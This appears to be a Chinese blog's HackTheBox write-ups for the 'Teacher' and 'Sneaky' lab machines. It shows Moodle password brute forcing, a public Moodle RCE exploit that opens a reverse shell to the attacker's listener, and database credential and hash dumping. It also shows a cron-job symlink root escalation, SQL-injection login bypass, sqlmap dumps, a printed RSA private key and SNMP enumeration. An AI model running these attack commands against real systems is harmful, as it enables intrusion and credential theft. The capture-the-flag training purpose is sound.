https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 41.73 seconds 用dirsearch扫描网站 1234[01:00:42] 301 - 310B - &#x2F;css -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;css&#x2F; [01:00:54] 301 - 312B - &#x2F;fonts -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;fonts&#x2F; [01:01:01] 301 - 313B - &#x2F;images -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;images&#x2F; [01:01:03] 200 - 8KB - &#x2F;index.html [01:01:06] 301 - 317B - &#x2F;javascript -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;javascript&#x2F; [01:01:07] 301 - 309B - &#x2F;js -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;js&#x2F;[01:01:15] 301 - 313B - &#x2F;manual -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;manual&#x2F;[01:01:15] 200 - 626B - &#x2F;manual&#x2F;index.html[01:01:19] 301 - 313B - &#x2F;moodle -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#x2F; Getting User Access 去看一下images目录： 一个个点开看一下，发现5.png无法显示，应该不是一个图片，下载后用Notepad++打开 12345678Hi Servicedesk,I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.Could you guys figure out what the last charachter is, or just reset it?Thanks,Giovanni 让我们猜解密码的最后一位，但是现在不知道用户名和密码是用在哪登录的，再去看moodle目录 Moodle是一个开源课程管理系统（CMS），也被称为学习管理系统（LMS）或虚拟学习环境（VLE）。它已成为深受世界各地教育工作者喜爱的一种为学生建立网上动态网站的工具。 用hydra爆破密码之前先用Python生成一个密码字典： 123with open(&#x27;pwd.txt&#x27;, &#x27;w&#x27;) as f: for i in range(0, 127): f.write(&#x27;Th4C00lTheacha&#123;&#125;\\n&#x27;.format(chr(i))) 再用hydra进行密码爆破，由于只有在我们提交正确的密码后才设置Cookie，因此我们会在Set-Cookie上将其匹配为正确的响应。 123456789$ hydra -I -l giovanni -P pwd.txt 10.10.10.153 http-post-form &quot;&#x2F;moodle&#x2F;login&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;Set-Cookie&quot;Hydra v9.0 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-03-22 04:23:47[DATA] max 16 tasks per 1 server, overall 16 tasks, 128 login tries (l:1&#x2F;p:128), ~8 tries per task[DATA] attacking http-post-form:&#x2F;&#x2F;10.10.10.153:80&#x2F;moodle&#x2F;login&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;Set-Cookie[80][http-post-form] host: 10.10.10.153 login: giovanni password: Th4C00lTheacha#1 of 1 target successfully completed, 1 valid password foundHydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2020-03-22 04:23:58 找到了密码login: giovanni&amp;password: Th4C00lTheacha#。 同时用nikto扫描一下有用的信息： 123456789101112131415161718192021222324252627282930313233343536$ nikto -host http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.10.153 + Target Hostname: 10.10.10.153+ Target Port: 80+ Start Time: 2020-03-22 02:49:41 (GMT-4)---------------------------------------------------------------------------+ Server: Apache&#x2F;2.4.25 (Debian)+ Cookie MoodleSession created without the httponly flag+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ Uncommon header &#39;content-script-type&#39; found, with contents: text&#x2F;javascript+ Uncommon header &#39;content-style-type&#39; found, with contents: text&#x2F;css+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Apache&#x2F;2.4.25 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ DEBUG HTTP verb may show server debugging information. See http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;e8z01xdh%28VS.80%29.aspx for details.+ &#x2F;moodle&#x2F;config.php: PHP Config file may contain database IDs and passwords.+ Uncommon header &#39;x-accel-buffering&#39; found, with contents: no+ OSVDB-3092: &#x2F;moodle&#x2F;auth&#x2F;: This might be interesting...+ OSVDB-3268: &#x2F;moodle&#x2F;backup&#x2F;: Directory indexing found.+ OSVDB-3092: &#x2F;moodle&#x2F;backup&#x2F;: This might be interesting...+ OSVDB-3268: &#x2F;moodle&#x2F;install&#x2F;: Directory indexing found.+ OSVDB-3092: &#x2F;moodle&#x2F;install&#x2F;: This might be interesting...+ OSVDB-3092: &#x2F;moodle&#x2F;lib&#x2F;: This might be interesting...+ OSVDB-3092: &#x2F;moodle&#x2F;login&#x2F;: This might be interesting...+ OSVDB-3268: &#x2F;moodle&#x2F;pix&#x2F;: Directory indexing found.+ OSVDB-3092: &#x2F;moodle&#x2F;pix&#x2F;: This might be interesting...+ OSVDB-3092: &#x2F;moodle&#x2F;INSTALL.txt: Default file found.+ OSVDB-3268: &#x2F;moodle&#x2F;repository&#x2F;: Directory indexing found.+ &#x2F;moodle&#x2F;repository&#x2F;: CRX WebDAV upload+ &#x2F;moodle&#x2F;composer.json: PHP Composer configuration file reveals configuration information - https:&#x2F;&#x2F;getcomposer.org&#x2F;+ &#x2F;moodle&#x2F;composer.lock: PHP Composer configuration file reveals configuration information - https:&#x2F;&#x2F;getcomposer.org&#x2F;+ &#x2F;moodle&#x2F;package.json: Node.js package file found. It may contain sensitive information.+ 7871 requests: 0 error(s) and 26 item(s) reported on remote host+ End Time: 2020-03-22 03:27:50 (GMT-4) (2289 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 主要是有两个文件值得注意： /moodle/config.php /moodle/INSTALL.txt config配置文件之后会用到，而INSTALL文件告诉了我们当前moodle的版本是3.2。 搜一下moodle相关的漏洞： 试一下Moodle 3.4.1 - Remote Code Execute的利用方式： 1234567891011121314151617181920212223242526272829303132$ sudo php 46551.php url&#x3D;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#x2F; user&#x3D;giovanni pass&#x3D;Th4C00lTheacha# ip&#x3D;10.10.16.89 port&#x3D;4444 course&#x3D;2*------------------------------** Noodle [Moodle RCE] (v3.4.1) **------------------------------*[!] Make sure you have a listener[!] at 10.10.16.89:4444[*] Logging in as user giovanni with password Th4C00lTheacha# [+] Successful Login[&gt;] Moodle Session q86b6t60vldlqjk0gp90u5mat0 [&gt;] Moodle Key N25C2hyBzu [*] Loading Course ID 2 [+] Successfully Loaded Course[*] Enable Editing[+] Successfully Enabled Course Editing[*] Adding Quiz[+] Successfully Added Quiz[*] Configuring New Quiz[+] Successfully Configured Quiz[*] Loading Edit Quiz Page [+] Successfully Loaded Edit Quiz Page[*] Adding Calculated Question [+] Successfully Added Calculation Question[*] Adding Evil Question [+] Successfully Created Evil Question[*] Sending Exploit[&gt;] You should receive a reverse shell attempt from the target at 10.10.16.89 on port 4444 [&gt;] If connection was successful this program will wait here until you close the connection.[&gt;] You should be able to Ctrl+C and retain the connection through netcat. 本机监听4444端口 1$ nc -lvvp 4444 listening on [any] 4444 ... 10.10.10.153: inverse host lookup failed: Unknown host connect to [10.10.16.89] from (UNKNOWN) [10.10.10.153] 42232 &#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off $ python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; www-data@teacher:&#x2F;var&#x2F;www&#x2F;html&#x2F;moodle&#x2F;question$ id id uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) 查看config.php网站文件 1234567891011121314151617181920212223242526272829303132www-data@teacher:&#x2F;var&#x2F;www&#x2F;html&#x2F;moodle$ cat config.phpcat config.php&lt;?php &#x2F;&#x2F; Moodle configuration fileunset($CFG);global $CFG;$CFG &#x3D; new stdClass();$CFG-&gt;dbtype &#x3D; &#39;mariadb&#39;;$CFG-&gt;dblibrary &#x3D; &#39;native&#39;;$CFG-&gt;dbhost &#x3D; &#39;localhost&#39;;$CFG-&gt;dbname &#x3D; &#39;moodle&#39;;$CFG-&gt;dbuser &#x3D; &#39;root&#39;;$CFG-&gt;dbpass &#x3D; &#39;Welkom1!&#39;;$CFG-&gt;prefix &#x3D; &#39;mdl_&#39;;$CFG-&gt;dboptions &#x3D; array ( &#39;dbpersist&#39; &#x3D;&gt; 0, &#39;dbport&#39; &#x3D;&gt; 3306, &#39;dbsocket&#39; &#x3D;&gt; &#39;&#39;, &#39;dbcollation&#39; &#x3D;&gt; &#39;utf8mb4_unicode_ci&#39;,);$CFG-&gt;wwwroot &#x3D; &#39;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#39;;$CFG-&gt;dataroot &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;moodledata&#39;;$CFG-&gt;admin &#x3D; &#39;admin&#39;;$CFG-&gt;directorypermissions &#x3D; 0777;require_once(__DIR__ . &#39;&#x2F;lib&#x2F;setup.php&#39;);&#x2F;&#x2F; There is no php closing tag in this file,&#x2F;&#x2F; it is intentional because it prevents trailing whitespace problems! 这里列出了MySQL数据库的登录用户名和密码：root和Welkom1! 12345678910111213www-data@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ mysql -u root -p mysql -u root -p Enter password: Welkom1! Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 949 Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1 Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.......MariaDB [moodle]&gt; select username, password from mdl_user;select username, password from mdl_user;+-------------+--------------------------------------------------------------+| username | password |+-------------+--------------------------------------------------------------+| guest | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO || admin | $2y$10$7VPsdU9&#x2F;9y2J4Mynlt6vM.a4coqHRXsNTOq&#x2F;1aA6wCWTsF2wtrDO2 || giovanni | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf&#x2F;M1Zkj&#x2F;i1VqLO0FSYO || Giovannibak | 7a860966115182402ed06375cf0a22af |+-------------+--------------------------------------------------------------+4 rows in set (0.00 sec) 查看那一串数字的加密方式 123456789101112131415161718$ hash-identifier 7a860966115182402ed06375cf0a22af ######################################################################### # __ __ __ ______ _____ # # &#x2F;\\ \\&#x2F;\\ \\ &#x2F;\\ \\ &#x2F;\\__ _\\ &#x2F;\\ _ &#96;\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\&#x2F;_&#x2F;\\ \\&#x2F; \\ \\ \\&#x2F;\\ \\ # # \\ \\ _ \\ &#x2F;&#39;__&#96;\\ &#x2F; ,__\\ \\ \\ _ &#96;\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\&#x2F;\\ \\_\\ \\_&#x2F;\\__, &#96;\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\&#x2F;\\____&#x2F; \\ \\_\\ \\_\\ &#x2F;\\_____\\ \\ \\____&#x2F; # # \\&#x2F;_&#x2F;\\&#x2F;_&#x2F;\\&#x2F;__&#x2F;\\&#x2F;_&#x2F;\\&#x2F;___&#x2F; \\&#x2F;_&#x2F;\\&#x2F;_&#x2F; \\&#x2F;_____&#x2F; \\&#x2F;___&#x2F; v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # #########################################################################--------------------------------------------------Possible Hashs:[+] MD5[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) 7a860966115182402ed06375cf0a22afmd5解密 12345678910www-data@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ su giovannisu giovanniPassword: expelledgiovanni@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ ididuid&#x3D;1000(giovanni) gid&#x3D;1000(giovanni) groups&#x3D;1000(giovanni)giovanni@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ ls &#x2F;home&#x2F;giovanni&#x2F; ls &#x2F;home&#x2F;giovanni&#x2F;user.txt work Getting Root Access 123456789101112131415161718192021222324252627282930giovanni@teacher:~&#x2F;work$ ls -lRls -lR.:total 8drwxr-xr-x 3 giovanni giovanni 4096 Jun 27 2018 coursesdrwxr-xr-x 3 giovanni giovanni 4096 Jun 27 2018 tmp.&#x2F;courses:total 4drwxr-xr-x 2 root root 4096 Jun 27 2018 algebra.&#x2F;courses&#x2F;algebra:total 4-rw-r--r-- 1 giovanni giovanni 109 Jun 27 2018 answersAlgebra.&#x2F;tmp:total 8-rwxrwxrwx 1 root root 256 Mar 22 16:08 backup_courses.tar.gzdrwxrwxrwx 3 root root 4096 Jun 27 2018 courses.&#x2F;tmp&#x2F;courses:total 4drwxrwxrwx 2 root root 4096 Jun 27 2018 algebra.&#x2F;tmp&#x2F;courses&#x2F;algebra:total 4-rwxrwxrwx 1 giovanni giovanni 109 Jun 27 2018 answersAlgebragiovanni@teacher:~&#x2F;work$ datedateSun Mar 22 16:08:17 CET 2020 我们可以发现/tmp/backup_courses.tar.gz的时间就是当前的时间，猜测这应该是一个定时任务。 定时任务的脚本位于/usr/bin/backup.sh： 123456#!&#x2F;bin&#x2F;bashcd &#x2F;home&#x2F;giovanni&#x2F;work;tar -czvf tmp&#x2F;backup_courses.tar.gz courses&#x2F;*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R; 我门只需要看到这个脚本执行后~/tmp目录下的所有文件或文件夹的权限变成了777，那么现在就很容易了，在tmp目录下新建一个根目录的软连接即可。 12345678910111213141516171819202122232425262728293031323334giovanni@teacher:~&#x2F;work&#x2F;tmp$ ln -s &#x2F; ca01hln -s &#x2F; ca01hgiovanni@teacher:~&#x2F;work&#x2F;tmp$ ls -la &#x2F;ls -la &#x2F;total 84drwxrwxrwx 22 root root 4096 Oct 28 2018 .drwxrwxrwx 22 root root 4096 Oct 28 2018 ..drwxrwxrwx 2 root root 4096 Oct 28 2018 bindrwxrwxrwx 3 root root 4096 Oct 28 2018 bootdrwxrwxrwx 17 root root 3080 Mar 22 05:06 devdrwxrwxrwx 84 root root 4096 Oct 28 2018 etcdrwxrwxrwx 3 root root 4096 Jun 27 2018 homelrwxrwxrwx 1 root root 29 Oct 28 2018 initrd.img -&gt; boot&#x2F;initrd.img-4.9.0-8-amd64lrwxrwxrwx 1 root root 29 Oct 28 2018 initrd.img.old -&gt; boot&#x2F;initrd.img-4.9.0-6-amd64drwxrwxrwx 15 root root 4096 Jun 27 2018 libdrwxrwxrwx 2 root root 4096 Jun 27 2018 lib64drwxrwxrwx 2 root root 16384 Jun 27 2018 lost+founddrwxrwxrwx 3 root root 4096 Jun 27 2018 mediadrwxrwxrwx 2 root root 4096 Jun 27 2018 mntdrwxrwxrwx 2 root root 4096 Jun 27 2018 optdrwxrwxrwx 93 root root 0 Mar 22 05:06 procdrwxrwxrwx 3 root root 4096 Nov 4 2018 rootdrwxrwxrwx 18 root root 500 Mar 22 05:06 rundrwxrwxrwx 2 root root 4096 Oct 28 2018 sbindrwxrwxrwx 2 root root 4096 Jun 27 2018 srvdrwxrwxrwx 13 root root 0 Mar 22 16:19 sysdrwxrwxrwx 2 root root 4096 Mar 22 06:26 tmpdrwxrwxrwx 10 root root 4096 Jun 27 2018 usrdrwxrwxrwx 12 root root 4096 Jun 27 2018 varlrwxrwxrwx 1 root root 26 Oct 28 2018 vmlinuz -&gt; boot&#x2F;vmlinuz-4.9.0-8-amd64lrwxrwxrwx 1 root root 26 Oct 28 2018 vmlinuz.old -&gt; boot&#x2F;vmlinuz-4.9.0-6-amd64giovanni@teacher:~&#x2F;work&#x2F;tmp$ ls -la &#x2F;root&#x2F;root.txtls -la &#x2F;root&#x2F;root.txt-rwxrwxrwx 1 root root 33 Jun 27 2018 &#x2F;root&#x2F;root.txt 0x04 CVE Analysis https://blog.ripstech.com/2018/moodle-remote-code-execution/ 0x05 Conclusion 渗透过程： 0x06 Reference https://ech1.netlify.com/htb/easy/26 https://blog.ripstech.com/2018/moodle-remote-code-execution/","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"靶机/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Sneaky Walkthrough","date":"2020-03-21T13:13:17.000Z","path":"Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough/","text":"不得不说这个靶机的质量非常高，值得一做。（假装安慰一下自己vip没有白充） HTB::Sneaky Walkthrough 0x01 Info Card 0x02 Prior knowledge IPv6 https://www.w3cschool.cn/ipv6/ipv6_address_types.html http://www.what21.com/sys/view/net_ipv6_1536653956137.html 主要搞清楚IPv6的地址类型和格式，以及本机Mac地址转换成本地唯一地址的计算方法 SNMP https://www.manageengine.com/network-monitoring/what-is-snmp.html 对于SNMP协议，主要是了解它的管理信息库(MIB，Management Information Base)和对象标识符(OID，Object ID)概念。管理信息库（MIB）是用于管理网络元素的信息的集合， 由对象标识符（OID）标识的管理对象组成了下面这种树状结构： Buffer overflow 0x03 Tools and Tips nmap sqlmap snmpwalk OR snmp-check gdb Basic SQL Injection Enumerating SNMP Basic buffer overflow exploitation 0x04 Pentesting nmap扫描靶机端口： 1234567891011121314151617181920212223242526272829Nmap scan report for 10.10.10.20Host is up (0.28s latency).Not shown: 65534 closed portsPORT STATE SERVICE VERSION80&#x2F;tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)|_http-title: Under Development!No exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).TCP&#x2F;IP fingerprint:OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;19%OT&#x3D;80%CT&#x3D;1%CU&#x3D;37304%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E72D70OS:C%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;107%GCD&#x3D;1%ISR&#x3D;10D%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54BST11NW7%O2&#x3D;M54BST11NW7%O3&#x3D;M54BNNT11NW7%O4&#x3D;M54BOS:ST11NW7%O5&#x3D;M54BST11NW7%O6&#x3D;M54BST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%WOS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54BNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;YOS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%FOS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RDOS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IEOS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)Network Distance: 2 hopsTRACEROUTE (using port 21&#x2F;tcp)HOP RTT ADDRESS1 228.00 ms 10.10.16.12 296.00 ms 10.10.10.20OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 523.52 seconds 访问80端口的站点： 是一个静态页面，用dirsearch扫描一下站点目录： 12345678910111213141516171819202122232425262728293031323334Target: http:&#x2F;&#x2F;10.10.10.20&#x2F;[22:26:48] Starting: [22:26:55] 403 - 289B - &#x2F;.ht_wsr.txt[22:26:55] 403 - 282B - &#x2F;.hta[22:26:55] 403 - 293B - &#x2F;.htaccess-local[22:26:55] 403 - 293B - &#x2F;.htaccess-marco[22:26:55] 403 - 291B - &#x2F;.htaccess-dev[22:26:55] 403 - 291B - &#x2F;.htaccess.BAK[22:26:55] 403 - 292B - &#x2F;.htaccess.bak1[22:26:55] 403 - 291B - &#x2F;.htaccess.old[22:26:55] 403 - 294B - &#x2F;.htaccess.sample[22:26:55] 403 - 292B - &#x2F;.htaccess.orig[22:26:55] 403 - 291B - &#x2F;.htaccess.txt[22:26:55] 403 - 292B - &#x2F;.htaccess.save[22:26:55] 403 - 293B - &#x2F;.htaccess_extra[22:26:55] 403 - 292B - &#x2F;.htaccess_orig[22:26:55] 403 - 290B - &#x2F;.htaccessBAK[22:26:55] 403 - 290B - &#x2F;.htaccess_sc[22:26:55] 403 - 290B - &#x2F;.htaccessOLD[22:26:55] 403 - 288B - &#x2F;.htaccess~[22:26:55] 403 - 291B - &#x2F;.htaccessOLD2[22:26:55] 403 - 286B - &#x2F;.htgroup[22:26:55] 403 - 291B - &#x2F;.htpasswd-old[22:26:55] 403 - 292B - &#x2F;.htpasswd_test[22:26:55] 403 - 288B - &#x2F;.htpasswds[22:26:56] 403 - 286B - &#x2F;.htusers[22:28:10] 301 - 307B - &#x2F;dev -&gt; http:&#x2F;&#x2F;10.10.10.20&#x2F;dev&#x2F;[22:28:10] 200 - 464B - &#x2F;dev&#x2F;[22:28:30] 200 - 183B - &#x2F;index.html[22:29:14] 403 - 291B - &#x2F;server-status[22:29:14] 403 - 292B - &#x2F;server-status&#x2F;Task Completed 发现了一个dev路径，是一个后台登录页面，用万能密码注入试一下： 成功登录： 有一个admin用户，还有一个SSH key，但是没有端口登录： 123456789101112131415161718192021222324252627-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5Lc4V+rY81lS4cWUx&#x2F;EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr3mi0MyfiGRh&#x2F;Xr4L0+SwYdylkuX72E7rLkkigSt4s&#x2F;zXp5dJmL2RBZDJf1Qh6UgbyDxG2ER49&#x2F;wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cncb+zfPcTvcP0t63kdEreQbdASYK6&#x2F;e7Iih&#x2F;5eBy3i8YoNJd6Wr8&#x2F;qVtmB+FuxcFjoOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7waNyp&#x2F;9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CRh6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G&#x2F;8U&#x2F;lcx1tiWfUNkLdCCphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX&#x2F;cUcblPDdOmxvazpnP4PW1rEpW8cTOtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817aI0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcBJkQxeUkCgYEA3RBR&#x2F;0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHYChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt&#x2F;MmoSaASbqpwhPSUCgYEA2uym+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwCGR4wYcZF0iH&#x2F;t4tn02qqOPaRGJAB3BD&#x2F;B8bRxncCgYBI7hpvITl8EGOoOVyqJ8neaK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q&#x2F;tv7E3kT195MuS10JVnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4xhxNWWZcUFcRuxp5ogcvBdQKBgQDB&#x2F;AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd1&#x2F;iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi&#x2F;93oJa1on&#x2F;QJlvbv4GO9y3LZLJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrGUkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k&#x2F;Hu+up36u92YlaT7Yk+fsk&#x2F;k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb-----END RSA PRIVATE KEY----- 用BurpSuite把请求数据包保存成sneaky.req文件，再用sqlmap跑一下： 1234567891011121314151617181920212223242526$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 --dbs...[00:33:32] [INFO] fetching database namesavailable databases [4]:[*] dev[*] information_schema [*] mysql [*] performance_schema$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; --tables...$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; --columns...$ sqlmap -r sneaky.req -p pass --dbms mysql --level 4 --risk 3 -D &#39;dev&#39; -T &#39;users&#39; -C &#39;name, pass&#39; --dump[00:38:48] [INFO] fetching entries of column(s) &#39;&#96;name&#96;, pass&#39; for table &#39;users&#39; in database &#39;dev&#39;Database: devTable: users[2 entries]+--------------+----------------------+| name | pass |+--------------+----------------------+| admin | sup3rstr0ngp4ssf0r4d || thrasivoulos | sup3rstr0ngp4ssf0r4d |+--------------+----------------------+ 扫出了两个用户，没啥思路了，看一下writeup提示，好吧，还要扫描UDP端口，161端口上运行snmp服务： 123456789101112131415161718192021PORT STATE SERVICE VERSION161&#x2F;udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)| snmp-info:| enterprise: net-snmp| engineIDFormat: unknown| engineIDData: fcf2da02d0831859| snmpEngineBoots: 8|_ snmpEngineTime: 6h24m47s| snmp-interfaces:| lo| IP address: 127.0.0.1 Netmask: 255.0.0.0| Type: softwareLoopback Speed: 10 Mbps| Traffic stats: 9.74 Kb sent, 9.74 Kb received| eth0| IP address: 10.10.10.20 Netmask: 255.255.255.0| MAC address: 00:50:56:b9:37:ed (VMware)| Type: ethernetCsmacd Speed: 4 Gbps|_ Traffic stats: 7.92 Mb sent, 7.47 Mb received| snmp-netstat:| TCP 127.0.0.1:3306 0.0.0.0:0|_ UDP 0.0.0.0:161 *:* 既然IPv4的防火墙没有开放22端口，换个思路看一下IPv6的端口开放情况，前提就是我们知道靶机的IPv6本地唯一地址（类似IPv6的内网/私网地址），这里就要利用SNMP服务。 使用snmpwalk工具扫描靶机上的设备： 1snmpwalk -v2c -c public 10.10.10.20 &gt; sneakly.snmp 打开文件之后直接全局搜索10.10.10.20： 我们就能找到靶机的IPv6地址(十进制表示) iso.3.6.1.2.1.4.34.1.4.2.16. 设备的OID号 转换成十六进制表示 1dead:beef::0250:56ff:feb9:2771 当然，我一开始打开这个文件也是一脸懵逼的状态，完全不知道输出的是什么意思，我们可以适当的让snmpwalk输出的内容更加可读： 12345# 安装软件sudo apt-get install snmp-mibs-downloader# 编辑文件，注释掉mibs:这一行vim &#x2F;etc&#x2F;snmp&#x2F;snmp.conf 我们再执行snmpwalk命令，这一次可以再加一个OID参数减少输出的内容 1234$ snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.4.2.16IP-MIB::ipAddressType.ipv6.&quot;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01&quot; &#x3D; INTEGER: unicast(1)IP-MIB::ipAddressType.ipv6.&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1)IP-MIB::ipAddressType.ipv6.&quot;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:27:71&quot; &#x3D; INTEGER: unicast(1) 整理一下和刚刚得到的地址是一样的。 